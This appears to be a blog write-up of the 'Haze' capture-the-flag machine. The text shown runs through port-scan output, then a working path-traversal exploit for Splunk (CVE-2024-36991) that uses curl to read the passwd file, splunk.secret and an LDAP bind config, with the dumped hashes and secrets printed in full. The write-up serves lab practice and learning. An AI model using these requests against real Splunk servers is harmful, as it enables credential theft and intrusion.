<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Haze (Hard)" />
<meta property="og:locale" content="en" />
<meta name="description" content="Haze is Hard rated machine which involves multiply step for exploitation it initial foothold is through a splunk instance that has a cve allowing local file read after getting credentials we will have have access" />
<meta property="og:description" content="Haze is Hard rated machine which involves multiply step for exploitation it initial foothold is through a splunk instance that has a cve allowing local file read after getting credentials we will have have access" />
<link rel="canonical" href="http://localhost:4000/posts/Haze/" />
<meta property="og:url" content="http://localhost:4000/posts/Haze/" />
<meta property="og:site_name" content="Blog" />
<meta property="og:image" content="http://localhost:4000/assets/posts/Haze/preview.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-06-29T00:00:00+03:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/posts/Haze/preview.png" />
<meta property="twitter:title" content="Haze (Hard)" />
<meta name="twitter:site" content="@twitter_username" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-29T00:00:00+03:00","datePublished":"2025-06-29T00:00:00+03:00","description":"Haze is Hard rated machine which involves multiply step for exploitation it initial foothold is through a splunk instance that has a cve allowing local file read after getting credentials we will have have access","headline":"Haze (Hard)","image":"http://localhost:4000/assets/posts/Haze/preview.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Haze/"},"url":"http://localhost:4000/posts/Haze/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Haze (Hard) | Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Blog">
<meta name="application-name" content="Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">Blog</a>
    <p class="site-subtitle fst-italic mb-0">CTF player, Wannabe Hacker</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/spect3r1"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/twitter_username"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="https://www.linkedin.com/in/ali-sherif-5987b41b2"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Haze (Hard)</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Haze (Hard)</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1751144400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jun 29, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/posts/Haze/preview.png" class="popup img-link preview-img shimmer"><img src="/assets/posts/Haze/preview.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/username">spect3r</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2448 words"
>
  <em>13 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Haze (Hard)</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Haze (Hard)</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <p>Haze is Hard rated machine which involves multiply step for exploitation it initial foothold is through a splunk instance that has a cve allowing local file read after getting credentials we will have have access</p>

<h1 id="recon">Recon</h1>

<h3 id="port-scan"><span class="me-2">port scan</span><a href="#port-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
</pre></td><td class="rouge-code"><pre><span class="c"># Nmap 7.95 scan initiated Sat Jun 28 16:09:36 2025 as: /usr/lib/nmap/nmap --privileged -vv -sC -sV -oN nmap 10.10.11.61</span>
Increasing send delay <span class="k">for </span>10.10.11.61 from 0 to 5 due to 94 out of 311 dropped probes since last increase.
Increasing send delay <span class="k">for </span>10.10.11.61 from 5 to 10 due to 11 out of 14 dropped probes since last increase.
Increasing send delay <span class="k">for </span>10.10.11.61 from 10 to 20 due to 20 out of 65 dropped probes since last increase.
Increasing send delay <span class="k">for </span>10.10.11.61 from 20 to 40 due to 49 out of 163 dropped probes since last increase.
Increasing send delay <span class="k">for </span>10.10.11.61 from 40 to 80 due to 11 out of 30 dropped probes since last increase.
Nmap scan report <span class="k">for </span>10.10.11.61
Host is up, received echo-reply ttl 127 <span class="o">(</span>1.3s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2025-06-28 16:09:38 EEST <span class="k">for </span>210s
Not shown: 985 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2025-06-28 18:11:43Z<span class="o">)</span>
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: haze.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.haze.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>haze-DC01-CA/domainComponent<span class="o">=</span>haze
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: haze.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.haze.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>haze-DC01-CA/domainComponent<span class="o">=</span>haze
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: haze.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.haze.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>haze-DC01-CA/domainComponent<span class="o">=</span>haze
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| <span class="nt">-----BEGIN</span> CERTIFICATE-----
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: haze.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.haze.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>haze-DC01-CA/domainComponent<span class="o">=</span>haze
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp open  http          syn-ack ttl 127 Splunkd httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Splunkd
| http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
8088/tcp open  ssl/http      syn-ack ttl 127 Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
|_http-title: 404 Not Found
| http-methods: 
|_  Supported Methods: GET POST HEAD OPTIONS
8089/tcp open  ssl/http      syn-ack ttl 127 Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
|_http-title: splunkd
|_http-server-header: Splunkd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46282/tcp): CLEAN (Couldn'</span>t connect<span class="o">)</span>
|   Check 2 <span class="o">(</span>port 43344/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Couldn<span class="s1">'t connect)
|   Check 3 (port 26877/udp): CLEAN (Failed to receive data)
|   Check 4 (port 16354/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-06-28T18:12:42
|_  start_date: N/A
|_clock-skew: 5h00m03s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 28 16:13:08 2025 -- 1 IP address (1 host up) scanned in 211.95 seconds

</span></pre></td></tr></tbody></table></code></div></div>

<p>As we can see we are dealing with an active directory setup and this is probably a domain controller as we could see from ssl cert it does leak the hostname and it also leaks the name of the domain controller which is dc01 so let’s add those to the hosts file</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>10.10.11.61 dc01 dc01.haze.htb haze.htb
</pre></td></tr></tbody></table></code></div></div>

<p>let’s check port 8000 it’s running a webserver
<a href="/assets/posts/Haze/Haze.png" class="popup img-link shimmer"><img src="/assets/posts/Haze/Haze.png" alt="" loading="lazy"></a>
we can find splunk running</p>

<h1 id="exploitation">Exploitation</h1>

<h2 id="cve-2024-36991"><span class="me-2">CVE-2024-36991</span><a href="#cve-2024-36991" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>if we go to https://haze.htb:8089 which is a service port related to splunk as well we could leak the version which is 9.2.1, this version  is vulnerable to CVE-2024-36991 it allows an attacker to read files on disk</p>

<p>Poc</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>➜  CVE-2024-36991 git:<span class="o">(</span>main<span class="o">)</span> ✗ curl  <span class="s2">"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/passwd"</span>
:admin:<span class="nv">$6$Ak3m7</span>.aHgb/NOQez<span class="nv">$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1</span>::Administrator:admin:changeme@example.com:::20152
:edward:<span class="nv">$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22</span>/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:<span class="nv">$6$j4QsAJiV8mLg</span>/bhA<span class="nv">$Oa</span>/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:<span class="nv">$6$Y5ds8NjDLd7SzOTW$Zg</span>/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
</pre></td></tr></tbody></table></code></div></div>
<p>tried to crack all of the password but that didn’t work let’s try and read some of splunks configuration files like</p>

<p>C:\Program Files\Splunk\etc\auth\splunk.secret
C:\Program Files\Splunk\etc\system\local\authentication.conf
reference: https://docs.splunk.com/Documentation/Splunk/latest/Admin/Authenticationconf</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre>➜  CVE-2024-36991 git:<span class="o">(</span>main<span class="o">)</span> ✗ curl  <span class="s2">"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret"</span>
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD                                                                                                                                                                        
➜  CVE-2024-36991 git:<span class="o">(</span>main<span class="o">)</span> ✗ curl  <span class="s2">"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/authentication.conf"</span>
<span class="o">[</span>splunk_auth]
minPasswordLength <span class="o">=</span> 8
minPasswordUppercase <span class="o">=</span> 0
minPasswordLowercase <span class="o">=</span> 0
minPasswordSpecial <span class="o">=</span> 0
minPasswordDigit <span class="o">=</span> 0

<span class="o">[</span>Haze LDAP Auth]
SSLEnabled <span class="o">=</span> 0
anonymous_referrals <span class="o">=</span> 1
bindDN <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Paul Taylor,CN<span class="o">=</span>Users,DC<span class="o">=</span>haze,DC<span class="o">=</span>htb
bindDNpassword <span class="o">=</span> <span class="nv">$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN</span>+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY<span class="o">=</span>
charset <span class="o">=</span> utf8
